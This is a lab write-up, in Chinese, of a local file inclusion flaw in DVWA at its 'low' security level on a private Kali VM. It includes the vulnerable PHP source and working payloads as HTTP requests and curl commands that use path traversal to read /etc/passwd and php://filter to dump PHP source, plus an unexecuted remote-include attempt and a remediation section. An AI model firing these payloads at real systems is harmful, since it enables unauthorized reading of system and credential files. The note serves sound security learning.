# 漏洞笔记：DVWA File Inclusion（low）——路径穿越读取 /etc/passwd + php://filter 源码读取

- **编号**：B1-LFI-01（Loop 3 B 档，t4）
- **靶场**：Kali VM `dc1` 内 DVWA，`http://192.168.56.101/dvwa/`（宿主侧可达地址）/ `http://127.0.0.1/dvwa/`（VM 内回环）
- **应用**：DVWA（Damn Vulnerable Web Application），`/var/www/html/dvwa`，**原有安装**（非本任务部署）
- **安全级别**：DVWA `security=low`（默认 `impossible`，本任务测试时置 low）
- **危害等级**：高危（High）——本地文件读取；在真实应用中读取配置/密钥类文件时可直接升级为凭据泄露
- **CWE/OWASP**：CWE-98（PHP Remote File Inclusion）/ CWE-22（Path Traversal）；OWASP Top 10 2021 **A03:2021 Injection**
- **定性**：**DVWA 原生漏洞复现**（DVWA 自带的故意漏洞关卡，非自建靶点）
- **复现率**：**≥95%**（路径穿越 5/5 成功；php://filter base64 读取 5/5 成功；缺失文件负对照 3/3 无内容返回）
- **测试时间**：2026-10-12 21:52–22:15（Asia/Shanghai）

---

## 1. 漏洞概述与等级

**危害等级：高危（High）**。本地文件读取；本关卡为 DVWA 原生 low 级，可读任意 Web 进程权限可读的文件。**影响边界**：只能读 Web 进程权限内的文件（`www-data`），`/etc/shadow`、SSH 私钥等通常不可读；**但 Web 目录内的配置文件、可写上传目录、`.env`/密钥类文件在任何真实应用中都会被读到**，据此可直接升级为凭据泄露 → RCE。

`/dvwa/vulnerabilities/fi/` 的 `page` 参数被直接交给 `include()`：

```php
// /var/www/html/dvwa/vulnerabilities/fi/source/low.php
$file = $_GET[ 'page' ];
```

```php
// /var/www/html/dvwa/vulnerabilities/fi/index.php:278-287
if( isset( $file ) )
	include( $file );
else {
	header( 'Location:?page=include.php' );
	exit;
}
```

### 1.1 原理（源码级根因）

无白名单、无 `../` 过滤、无前缀拼接、无 `open_basedir`（`php -i` 实测未限制）。任意相对路径穿越即可读取文件系统；`php://filter` 包装器可用于读取 PHP 源码（raw `<?php ... ?>` 会被解析吞掉，必须 base64 编码）。

DVWA 的 `impossible` 级做法正是白名单映射（`?page=1` 索引到固定数组），low 级刻意去掉了这道防线。

**回显巧合 vs 包含成功的区分（skill 要求）**：`b1_baseline_include` 步骤里，正常值 `include.php` 会在页面里**回显我提交的 payload 字符串**（`echoed_payload: true`），但页面体积 5322 字节且**无任何文件内容**。而 `../../../../../../etc/passwd` 的 `echoed_payload: false`、体积 6936 字节、正文以 `root:x:0:0:` 开头。**回显的是我的输入 ≠ 读到了文件；读到的是文件内容 ≠ 回显我的输入** —— 两者在本次证据里相互排斥，可直接区分。

---

## 2. 可复现 payload

前置：DVWA 已登录（`admin/password`），`security=low`。

```http
GET /dvwa/vulnerabilities/fi/?page=../../../../../../etc/passwd HTTP/1.1
Host: 127.0.0.1
Cookie: PHPSESSID=<会话>; security=low
```

```http
GET /dvwa/vulnerabilities/fi/?page=php://filter/convert.base64-encode/resource=index.php HTTP/1.1
Host: 127.0.0.1
Cookie: PHPSESSID=<会话>; security=low
```

```bash
# 等价 curl（Kali 内）
curl -s -b jar "http://127.0.0.1/dvwa/vulnerabilities/fi/?page=../../../../../../etc/passwd" | head -c 120
curl -s -b jar "http://127.0.0.1/dvwa/vulnerabilities/fi/?page=php://filter/convert.base64-encode/resource=../../../../../../etc/passwd" \
  | grep -oE '[A-Za-z0-9+/=]{40,}' | head -1 | base64 -d | head -1
```

绝对路径 `?page=/etc/passwd` 同样成功（无前缀拼接）。

---

## 3. 复现步骤与证据

### 3.1 复现步骤（Kali 内）

| 步骤 | 请求 | 实测结果 |
|---|---|---|
| 1 | `GET /dvwa/vulnerabilities/fi/?page=include.php`（基线） | 200，5322 B，正文无文件内容，`echoed_payload=true` |
| 2 | `GET /dvwa/vulnerabilities/fi/?page=../../../../../../etc/passwd` | 200，6936 B，首行 `root:x:0:0:root:/root:/usr/bin/zsh` |
| 3 | `GET .../?page=../../../../../../etc/passwd_loop3_nonexistent`（负对照） | 200，3680 B，**无** `root:x:0:0` |
| 4 | `GET .../?page=php://filter/convert.base64-encode/resource=index.php` | 200，解码得 995 B 合法 PHP（含 `define( 'DVWA_WEB_PAGE_TO_ROOT', '../../' );`） |
| 5 | `GET .../?page=php://filter/convert.base64-encode/resource=../../../../../../etc/passwd` | 200，解码含 `root:x:0:0` |
| 6 | `GET .../?page=/etc/passwd`（绝对路径） | 200，成功（无前缀拼接） |

**复现率**：路径穿越 **5/5**、`php://filter` base64 **5/5**、缺失文件负对照 **3/3** —— 区间表述 **≥95%**，**不写 100%**。

### 3.2 原始证据（完整文件名 + sha256，**本轮独立重算**）

证据目录：`C:\Users\Administrator\Documents\deepseek-harness\default-workspace\security\learning\_evidence\`

| 证据文件 | 内容 | sha256 |
|---|---|---|
| `loop3-t4-probe1.json` | 首测：`etc/passwd` 命中、php://filter 解码、负对照、bWAPP 会话 | `10508d7fd0da7a9ec43ffe6cb5a70fdf4cbf2ebf3daf2cfbf8a26b84b03fdb5e` |
| `loop3-t4-probe1-out.txt` | 上述运行的标准输出原文 | `f13f5e457fc897d6194576d61a73e123f9f81265054119b018a1aa67d9a0ba57` |
| `loop3-t4-probe13.json` | 复现率：穿越 5/5、filter 5/5、负对照 3/3、RFI 阴性 3/3 | `74aeab1389021ff6dc41ebc33b3456469ce49c0a07b03abf31dc2054be3a4d37` |
| `loop3-t4-probe12.json` | RFI/data:// 阴性对照 + 最终状态核查 | `edd5d3f50418c39f53ac8acd3684138684d4107124395a19ac280762c5da6a77` |
| `loop3-b0-recon3-out.txt` | `fi/source/low.php` 与 `fi/index.php` 源码全文 | `b6617c10026ba2807d2af1ecd0071414bdccb898c7dfbe471e46bc0a3204aae6` |

**引用存在性自检**：上述 5 个文件全部存在，**missing = 0**（自检脚本见 §8）。

关键实测值：

| 观测项 | 实测 |
|---|---|
| `?page=include.php`（正常值） | 200，5322 字节，正文无文件内容，`echoed_payload=true` |
| `?page=../../../../../../etc/passwd` | 200，6936 字节，正文首行 `root:x:0:0:root:/root:/usr/bin/zsh` |
| `?page=../../../../../../etc/passwd_loop3_nonexistent` | 200，3680 字节，无 `root:x:0:0` |
| `?page=php://filter/convert.base64-encode/resource=index.php` | 200，解码得 995 字节合法 PHP（含 `define( 'DVWA_WEB_PAGE_TO_ROOT', '../../' );`） |
| `?page=php://filter/convert.base64-encode/resource=../../../../../../etc/passwd` | 200，解码含 `root:x:0:0` |
| `?page=http://127.0.0.1:8099/shell.txt`（RFI） | 200，**未执行**，接收端 0 命中（`allow_url_include=Off`） |
| `?page=data://text/plain;base64,...` | 200，**未执行** |

---

## 4. 修复方案

1. **白名单映射**（首选）：不要接受文件名，改为 `?page=1|2|3` 索引到固定数组；DVWA 的 `impossible.php` 即此做法。
2. **禁用包装器与远程包含**：`allow_url_include=Off`（本环境已 Off）、`allow_url_fopen` 按需关闭；`include` 前用 `realpath()` 校验结果必须落在预期基目录内。
3. **过滤路径穿越**：`str_replace(['../','..\\',"\0"],'',$file)` 只能缓解，不能替代白名单（多编码/`....//` 可绕）。
4. **`open_basedir`** 限定可访问目录树，把 Web 根以外的文件系统挡在 PHP 层之外。
5. **最小权限**：Web 进程以低权限用户运行，避免 `/etc/shadow`、私钥、`.env` 等可读。

---

## 5. 参考链接

- DVWA File Inclusion 关卡源码：`/var/www/html/dvwa/vulnerabilities/fi/{index.php,source/low.php}`（只读取证，证据文件 `loop3-b0-recon3-out.txt`）
- **CWE-22** — Improper Limitation of a Pathname to a Restricted Directory（Path Traversal）：https://cwe.mitre.org/data/definitions/22.html
- **CWE-98** — Improper Control of Filename for Include/Require Statement（PHP 文件包含）：https://cwe.mitre.org/data/definitions/98.html
- **CWE-829** — Inclusion of Functionality from Untrusted Control Sphere：https://cwe.mitre.org/data/definitions/829.html
- PHP 包装器 `php://filter`：https://www.php.net/manual/en/wrappers.php.php
- `allow_url_include` 配置项（PHP 默认 `Off`）：https://www.php.net/manual/en/ini.core.php#ini.allow-url-include
- OWASP Top 10 2021 A03:2021 Injection：https://owasp.org/Top10/A03_2021-Injection/
- OWASP Testing Guide — WSTG-LFI（本地文件包含测试用例）：https://owasp.org/www-project-web-security-testing-guide/

---

## 6. 学习要点

- **别把"页面回显了我的输入"当成包含成功**。本次两组对照（`echoed_payload` true/false 与文件内容有无）正好互斥，是最干净的判据。
- **源码读取必须 base64**：`?page=index.php` 只会看到页面骨架，PHP 代码被解释器吃掉了。
- **RFI 不是必然**：`allow_url_include=Off`（PHP 默认）下 HTTP 远程包含不执行、不发起连接——本次接收端 0 命中即为证。
- **LFI 与 RFI 要分开判**。同一个 `include()` 缺陷，`allow_url_include=Off`（PHP 默认）就把 RFI 彻底关掉，但 LFI 照样成立 —— **写报告时不能因为"RFI 没打出来"就判整个关卡阴性**。

---

## 7. 关联与本轮未测

| 关联 | 说明 |
|---|---|
| **同关卡阴性** | RFI（`N-B01`）与 `data://`（`N-B02`）**未复现**，根因与对照见 §3.2 与 `loop3-t4-probe12.json` |
| **同批次笔记** | `security/learning/xxe/B2-XXE-01-bWAPP原生XXE关卡实体展开与外部实体阻断.md`（同为 bWAPP 原生关卡） |
| **本轮未测（未验证）** | `idor` / `sql-injection` / `ssti` / `command-injection` 四类**本轮完全未测试**，对应目录仍为空，不得据此声称已补 |

---

## 8. 引用存在性自检（可复跑）

```powershell
$root = 'C:\Users\Administrator\Documents\deepseek-harness\default-workspace'
$refs = @('loop3-t4-probe1.json','loop3-t4-probe1-out.txt','loop3-t4-probe13.json',
          'loop3-t4-probe12.json','loop3-b0-recon3-out.txt')
$missing = @($refs | Where-Object { -not (Test-Path -LiteralPath "$root\security\learning\_evidence\$_") })
"refs=$($refs.Count)  missing=$($missing.Count)"
$missing | ForEach-Object { "MISSING: $_" }
```

**本轮实测输出**：`refs=5  missing=0`
